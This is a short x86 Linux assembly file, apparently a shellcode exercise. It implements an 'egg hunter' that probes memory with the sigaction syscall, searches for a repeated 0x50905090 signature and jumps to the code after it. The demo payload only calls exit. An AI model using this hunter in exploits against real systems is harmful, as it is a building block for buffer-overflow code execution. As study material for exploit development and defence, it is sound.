global _start

section .text

poc:
    nop         ; beginning of signature 
    push eax
    nop
    push eax
    nop
    push eax
    nop
    push eax
    nop 
    push eax
    nop 
    push eax 
    nop 
    push eax
    nop
    push eax  ; end of signature 
    
    xor eax, eax ; eax = 0
    mov al, 0x1  ; exit syscall 
    xor ebx, ebx ; ebx = 0
    mov bl, 0x10 ; ebx = 0x10, 16 decimal 
    int 0x80     ; call exit 

_start:
entry1:
    cld
    mov bl, 0xff
    or cx, 0xfff
    xor edx, edx 
entry2:
    inc ecx 
    xor eax, eax
    mov al,0x43
    int 0x80
    cmp al,0xf2
    jz entry1
    mov eax, 0x50905090
    mov edi, ecx 
    scasd
    jnz entry2 
    scasd 
    jnz entry2
    jmp edi 
